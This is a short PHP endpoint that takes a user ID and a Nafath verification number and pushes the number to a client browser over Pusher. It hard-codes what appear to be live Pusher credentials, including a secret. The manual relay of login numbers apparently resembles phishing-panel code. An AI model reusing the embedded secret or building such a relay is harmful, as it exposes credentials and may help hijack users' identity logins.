<?php
session_start();
require_once('init.php');

header('Content-Type: application/json; charset=utf-8');

if (!isset($_POST['user_id']) || !isset($_POST['number'])) {
    echo json_encode(['success' => false, 'error' => 'بيانات مفقودة']);
    exit;
}

$userId = intval($_POST['user_id']);
$number = trim($_POST['number']);

if (empty($number)) {
    echo json_encode(['success' => false, 'error' => 'الرقم فارغ']);
    exit;
}

try {
    $result = $User->sendNafathNumber($userId, $number);
    
    if ($result) {
        // إرسال Pusher للعميل
        require_once '../vendor/autoload.php';
        
        $pusher = new Pusher\Pusher(
            'a56388ee6222f6c5fb86',
            '4c77061f4115303aac58',
            '1973588',
            ['cluster' => 'ap2', 'useTLS' => true]
        );

        $pusher->trigger('nafath-channel', 'nafath-event', [
            'userId' => $userId,
            'number' => $number
        ]);
        
        echo json_encode(['success' => true, 'message' => 'تم الإرسال']);
    } else {
        echo json_encode(['success' => false, 'error' => 'فشل الحفظ']);
    }
    
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'خطأ في الخادم']);
}